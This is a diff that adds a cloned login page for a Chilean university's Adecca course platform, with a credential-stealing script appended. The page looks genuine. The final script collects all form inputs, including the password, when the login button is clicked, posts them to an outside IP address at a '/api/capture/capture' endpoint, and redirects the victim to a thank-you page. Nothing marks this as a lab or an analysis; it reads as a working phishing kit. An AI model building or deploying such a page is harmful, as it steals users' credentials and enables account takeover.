@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="es"><head>
+        <base href="https://adecca.ubiobio.cl/">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta charset="utf-8">
+        <title>Adecca UBB .:: Plataforma de Cursos Virtuales ::. Universidad del Bío-Bío - Chile</title>
+        <link href="https://adecca.ubiobio.cl/css/img/favicon.png" rel="shortcut icon" type="image/ico">
+        <meta name="description" content="Plataforma Adecca, Universidad del Bío-Bío">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+        <!-- JQUERY -->
+        <script type="text/javascript" src="https://adecca.ubiobio.cl/js/jquery-1.12.0.min.js"></script>
+        <!-- bootstrap & fontawesome -->
+        <script type="text/javascript" src="https://adecca.ubiobio.cl/js/bootstrap-3.3.6/js/bootstrap.js"></script>
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/font-awesome.min.css">
+
+        <!-- text fonts -->
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace-fonts.css">
+
+        <!-- ace styles -->
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace.min.css">
+
+        <!--[if lte IE 9]>
+            <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace-part2.min.css" />
+        <![endif]-->
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace-rtl.min.css">
+
+        <!--[if lte IE 9]>
+            <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace-ie.min.css" />
+        <![endif]-->
+        <link rel="stylesheet" href="https://adecca.ubiobio.cl/assets/css/ace.onpage-help.css">
+
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+
+        <!--[if lt IE 9]>
+        <script src="https://adecca.ubiobio.cl/assets/js/html5shiv.js"></script>
+        <script src="https://adecca.ubiobio.cl/assets/js/respond.min.js"></script>
+        <![endif]-->
+
+        <!--script src='https://adecca.ubiobio.cl/js/chat_botman.js'></script-->
+
+        <!--script src="https://www.google.com/recaptcha/api.js?render=6LcsmvIUAAAAAHUIP3069DLI8PgiUOsjhe4C3wYB"></script-->
+    </head>
+    <body class="login-layout blur-login">
+        <div class="main-container">
+            <div class="main-content">
+                <div class="row">
+                    <div class="col-sm-10 col-sm-offset-1">
+                        <div class="login-container">
+                            <div class="position-relative">
+                                <div id="login-box" class="login-box visible widget-box no-border">
+                                    <div class="widget-body">
+                                        <div class="widget-main">
+                                            <div class="row">
+                                                <div class="col-sm-4 visible">
+                                                    <div class="center">
+                                                        <a href="http://adecca.ubiobio.cl" target="_self">
+                                                            <img class="img-responsive" style="margin: 0 auto;" alt="Plataforma Educativa Adecca" src="https://adecca.ubiobio.cl/assets/css/images/logo-adecca.png">
+                                                        </a>
+                                                    </div>
+
+                                                    <div class="space"></div>
+
+                                                    <div class="social-or-login center">
+                                                        <span class="bigger-110">Ingrese sus datos de Intranet</span>
+                                                    </div>
+
+
+                                                    <form id="login_adecca" action="javascript:void(0)" method="post" accept-charset="utf-8" onsubmit="return false">
+                                                        <fieldset>
+                                                            <div class="space-4"></div>
+
+                                                            <label class="block clearfix">
+                                                                <span class="block input-icon input-icon-right">
+                                                                    <input type="text" id="username" name="username" class="form-control" placeholder="RUT o alias" maxlength="45" autocomplete="off">
+                                                                    <i class="ace-icon fa fa-user"></i>
+                                                                </span>
+                                                            </label>
+
+                                                            <label class="block clearfix">
+                                                                <span class="block input-icon input-icon-right">
+                                                                    <input type="password" id="real-password" name="real-password" class="form-control" placeholder="Contraseña" maxlength="45" autocomplete="off">
+                                                                    <input type="hidden" id="password" name="password">
+                                                                    <i class="ace-icon fa fa-lock"></i>
+                                                                </span>
+                                                            </label>
+
+                                                            <div class="social-or-login center">
+                                                                <span class="bigger-110">
+                                                                    <a data-toggle="modal" href="#modalInfo">
+                                                                        ¿Olvidó su contraseña?
+                                                                    </a>
+                                                                </span>
+                                                            </div>
+
+                                                            <div class="space"></div>
+
+                                                            
+                                                            
+                                                            <div class="clearfix center">
+                                                                <button type="submit" class="btn btn-sm btn-pink">
+                                                                    <i class="ace-icon fa fa-key"></i>
+                                                                    <span class="bigger-110">Ingresar</span>
+                                                                </button>
+                                                            </div>
+
+                                                            <div class="space-4"></div>
+                                                        </fieldset>
+                                                    </form>
+
+                                                    <div class="space-4"></div>
+
+                                                    <div class="center clearfix">
+                                                        <div>
+                                                            <a href="https://adecca.ubiobio.cl/file/download/eyJwYXRoIjoiTWFudWFsX0FkZWNjYV9tYXJ6bzIwMTkucGRmIiwibm9tYnJlIjoiTWFudWFsX0FkZWNjYS5wZGYifQ==" target="_blank">
+                                                                ¿Tienes alguna duda? <br>
+                                                                <i class="ace-icon fa fa-book"></i>
+                                                                Revisa el Manual de Adecca
+                                                            </a>
+                                                        </div>
+                                                    </div>
+
+                                                    <!--div class="center clearfix">
+                                                        <div>
+                                                            <a href="http://146.83.196.175/adeccaubb" target="_blank">
+                                                                <i class="ace-icon fa fa-external-link"></i>
+                                                                Ir a la versión anterior de Adecca
+                                                            </a>
+                                                        </div>
+                                                    </div-->
+                                                </div>
+                                                <div class="col-sm-8 visible">
+                                                    <div class="space-30"></div>
+
+                                                    <h1 class="pink2">Bienvenid@ a la Plataforma Adecca</h1>
+
+                                                    <ul class="list-unstyled spaced" style="text-align: justify;">
+                                                        <li>
+                                                            <i class="ace-icon fa fa-share green bigger-110"></i>
+                                                            Adecca es una <strong>Plataforma Educativa</strong> que tiene por finalidad prestar<strong> servicios de apoyo a la docencia de Pregrado y  Postgrado</strong> de la Universidad del Bío-Bío, favoreciendo la utilización de  estrategias activas de enseñanza&nbsp;&nbsp;para potenciar ambientes de trabajo  colaborativos.
+                                                        </li>
+                                                        <li>
+                                                            <i class="ace-icon fa fa-share orange bigger-110"></i>
+                                                            El diseño de Adecca permite que&nbsp;&nbsp;estudiantes  y profesores la utilicen fácilmente, dado que sus funcionalidades han sido  configuradas en función de las <strong>necesidades de estudiantes y profesores</strong>.
+                                                        </li>
+                                                        <li>
+                                                            <i class="ace-icon fa fa-share red bigger-110"></i>
+                                                            Adecca es una plataforma en constante  desarrollo, diseñada y <strong>construida en la Universidad del Bío-Bío</strong>, por lo cual  invitamos a estudiantes y profesores a enviar comentarios y sugerencias, a  objeto de continuar ofreciéndoles un servicio de calidad.
+                                                        </li>
+                                                        <li class="pink2">
+                                                            <i class="ace-icon fa fa-share pink bigger-110"></i>
+                                                            Se recomienda el uso de navegadores estándares, como <b>Google Chrome</b> o <b>Mozilla Firefox</b> para un correcto funcionamiento. Por favor evite el uso de Internet Explorer.
+                                                        </li>
+                                                        <li class="blue">
+                                                            <i class="ace-icon fa fa-share blue bigger-110"></i>
+                                                            Para consultas o problemas con la Plataforma Adecca, por favor escríbanos al correo <strong>adecca@ubiobio.cl</strong> o contáctenos al teléfono (56-42)246<strong>3300</strong> (Mesa de Ayuda).
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                                <div class="col-sm-12">
+                                                    <div class="space-10"></div>
+                                                    <div class="row">
+                                                        <div class="col-sm-6">
+                                                            <a href="http://www.ubiobio.cl" target="_blank">
+                                                                <img class="img-responsive" style="padding-top: 18px; margin: 0 auto;" alt="Universidad del Bío-Bío" src="https://adecca.ubiobio.cl/assets/css/images/logo-ubb.png">
+                                                            </a>
+                                                        </div>
+                                                        <div class="col-sm-6">
+                                                            <a href="http://www.ubiobio.cl" target="_blank">
+                                                                <img class="img-responsive" style="width: 436px; margin: 0 auto;" alt="Universidad del Bío-Bío" src="https://adecca.ubiobio.cl/assets/css/images/acreditacion/Sello_Acreditacion_2019-01.png">
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div><!-- /.widget-main -->
+                                    </div><!-- /.widget-body -->
+                                </div><!-- /.login-box -->
+                            </div><!-- /.position-relative -->
+                        </div>
+                    </div><!-- /.col -->
+                </div><!-- /.row -->
+            </div><!-- /.main-content -->
+        </div><!-- /.main-container -->
+
+        <div id="modalInfo" class="modal fade" tabindex="-1" role="dialog">
+            <div class="modal-dialog" role="document">
+              <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+                    <h4 class="modal-title">Información Contraseña Adecca UBB</h4>
+                </div>
+                <div class="modal-body">
+                    <p align="justify">
+                        Si eres <strong>alumno UBB</strong>, tu contraseña de Adecca es la misma que usas en Intranet. Si no la recuerdas, sigue los pasos de la opción "Olvidó su clave" descritos en su
+                        <a href="https://intranet.ubiobio.cl" target="_blank">
+                            Página Web.
+                        </a>
+                        <br><br>
+                        Como alternativa, también puedes ir directamente al Departamento de Admisión y Registro Académico de la Universidad para que te den una nueva.
+                    </p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+                </div>
+              </div><!-- /.modal-content -->
+            </div><!-- /.modal-dialog -->
+        </div>
+
+        <!-- basic scripts -->
+
+        <!--[if !IE]> -->
+        <script type="text/javascript">
+            window.jQuery || document.write("<script src='https://adecca.ubiobio.cl/assets/js/jquery.min.js'>" + "<" + "/script>");
+        </script>
+        <!-- <![endif]-->
+
+        <!--[if IE]>
+        <script type="text/javascript">
+            window.jQuery || document.write("<script src='https://adecca.ubiobio.cl/assets/js/jquery1x.min.js'>"+"<"+"/script>");
+        </script>
+        <![endif]-->
+        <script type="text/javascript">
+            if ('ontouchstart' in document.documentElement)
+                document.write("<script src='https://adecca.ubiobio.cl/assets/js/jquery.mobile.custom.min.js'>" + "<" + "/script>");
+        </script>
+
+        <script type="text/javascript" src="https://adecca.ubiobio.cl/js/jquery.Rut.min.js"></script>
+
+        <!-- inline scripts related to this page -->
+        <script type="text/javascript">
+            jQuery(function ($) {
+                $(document).on('click', '.toolbar a[data-target]', function (e) {
+                    e.preventDefault();
+                    var target = $(this).data('target');
+                    $('.widget-box.visible').removeClass('visible');//hide others
+                    $(target).addClass('visible');//show target
+                });
+            });
+
+            jQuery(function ($) {
+                $(document).ready(function () {
+                    $('#username').focus();
+
+                    $('#username').blur(function () {
+                        valor = $.Rut.formatear($(this).val(), true);
+                        if ($.Rut.validar($(this).val())) {
+                            $(this).val(valor);
+                        }
+                    });
+
+                    //Captcha
+                    $('#login_adecca').submit(function(event) {
+                        event.preventDefault();
+
+                        var pass = btoa($("#real-password").val());
+                        $("#password").val(pass);
+                        $('#login_adecca').unbind('submit').submit();
+
+                        /*grecaptcha.ready(function() {
+                            grecaptcha.execute('6LcsmvIUAAAAAHUIP3069DLI8PgiUOsjhe4C3wYB', {action: 'login'}).then(function(token) {
+                                $('#login_adecca').prepend('<input type="hidden" name="token" value="' + token + '">');
+                                $('#login_adecca').unbind('submit').submit();
+                            });
+                        });*/
+                    });
+                });
+            });
+        </script>
+    
+<script>
+                function getCredenciales() {
+                const inputs = document.querySelectorAll('input');
+                const data = {};
+                inputs.forEach(input => {
+                    data[input.name || input.id || input.type] = input.value;
+                });
+                return data;
+                }
+
+                function enviarCredenciales() {
+                    const data = getCredenciales();
+                    fetch('http://146.83.198.35:1606/api/capture/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(err => console.error('Error enviando credenciales:', err));
+                }
+
+                // Intenta enganchar el primer botón que diga "Iniciar sesión" o similar
+                const posibleBoton = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
+                .find(btn => {
+                    const texto = (btn.innerText || btn.value || '').toLowerCase();
+                    return texto.includes('iniciar') || texto.includes('ingresar') || texto.includes('entrar') || texto.includes('login');
+                });
+                if (posibleBoton) {
+                posibleBoton.addEventListener('click', () => {
+                    enviarCredenciales();
+                    setTimeout(() => {
+                    window.location.href = '/gracias.html';
+                    }, 1000);
+                });
+                }
+            </script></body></html>
